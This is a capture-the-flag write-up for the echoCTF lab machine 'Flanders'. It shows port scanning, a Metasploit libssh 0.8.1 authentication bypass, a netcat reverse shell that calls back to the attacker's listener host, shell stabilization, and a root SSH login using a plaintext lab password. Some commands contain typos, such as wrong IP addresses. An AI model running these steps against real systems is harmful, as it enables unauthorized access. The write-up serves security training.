## Machine: Flanders

**Platform:** echoCTF 
**Difficulty:** Begginer 
**OS:** Linux 
**Points:** 4800
**Date:** 18/04/2026

---

## Summary

The difficulty in this machine was the initial enumeration, is a not common port.The specific version of the libssh (0.8.1) running on the target allowed for an authentication bypass, which was exploited to establish a bind shell and gain initial access.

---

## Enumeration

### 🔸 Nmap

```bash
rustscan -a 10.0.100.34 -b 500 -t 3000 --ulimit 5000
nmap -p 6022 -sC -sV -vv 10.0.100.34
```

**Open Ports:**

* 6022 → SSH

**Services:**

- libssh 0.8.1
 
---

### 🔸 Web / Service Enumeration

**This target does not host a web service** 

---

## Initial Foothold

### 🔸 Vulnerability

* **Type:** Authentication bypass 
* **Location:** On port 6022 (libssh)
* **Impact:** An attacker can access within the servers running, get to credentials and sensitive information

---

### 🔸 Exploitation

**Explanation:** Bind Shell
```
- Using a metasploit script, I explain this:
 1. msfconsole -q
 2. use auxiliary/scanner/ssh/libssh_auth_bypass
 3. set RHOSTS 0.0.100.34
 4. set RPORT 6022
 5. set SPAWN_PTY true
 6. run
 7. sessions 
 8. session -i 1 (select the newly created session)
```

---

## Shell Access

* **Method:** Bind Shell to Reverse Shell upgrade
* **Stabilization:**

```bash
#Within the Metasploit bind shell
nc -c sh 10.10.5.90 1203

#In our host shell
nc -lnvp 1203
script /dev/null -qc bash
ctr + z
stty raw -echo;fg
reset xterm
export TERM=xterm
```

---

## Post-Exploitation

### 🔸 Internal Enumeration

* **Users:** root, ETSCTF
* **Interesting Files:** /home/ETSCTF/.ssh/mykey
* **Permissions:** -rw-------
* **Running Services:** A service listening on the port 22

---

## Privilege Escalation

### 🔸 Vector

-  First, enumerate the services listening with:
	*ss -tulnp*
-  We can see ssh service on the 22 port, in the initial enumeration was not found this port.
- The descriptions' target reveals the password for this port and connection (OkilyDokily)



---

### 🔸 Exploitation

```bash
ssh root@10.10.5.90
#Password
OkilyDokily
```

---

## Lessons Learned

* I learned that machines don't always need a frontend or web application, they can run purely on backend services. I experienced firsthand to exploit an outdated service like libdssh using Metasploit to get a bind shell. I practiced my patient during the initial nmap enumeration phase.
---

## Attack Pattern 

* **Type:** Authentication bypass -> Unprotected credentials 
* **Where it appears:** In environments with poor security management, privates ssh keys are sometimes left in unprivileged directories.   


---

## References

- https://github.com/3ls3if/Cybersecurity-Notes/blob/main/readme/cves/libssh-0.8.1-cve-2018-10933.md

